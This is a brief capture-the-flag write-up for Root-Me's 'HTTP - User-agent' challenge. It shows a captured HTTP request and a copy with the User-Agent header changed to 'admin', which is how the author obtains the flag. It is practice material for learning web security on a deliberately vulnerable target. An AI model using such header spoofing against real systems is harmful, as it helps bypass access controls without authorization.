# Challange Info

Name : HTTP - User-agent

Difficulty : Very easy

Category : Web Server

Link : https://www.root-me.org/en/Challenges/Web-Server/HTTP-User-agent

# Writeup

Refreshing the webpage and capturing the request through burpsuite.

Sending the request to repeater.

```
GET /web-serveur/ch2/ HTTP/1.1

Host: challenge01.root-me.org

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

sec-gpc: 1

Connection: keep-alive
```

Changing user-agent to `admin`.

```
GET /web-serveur/ch2/ HTTP/1.1

Host: challenge01.root-me.org

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

User-Agent: admin

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

sec-gpc: 1

Connection: keep-alive
```

In response of this request I got the flag.
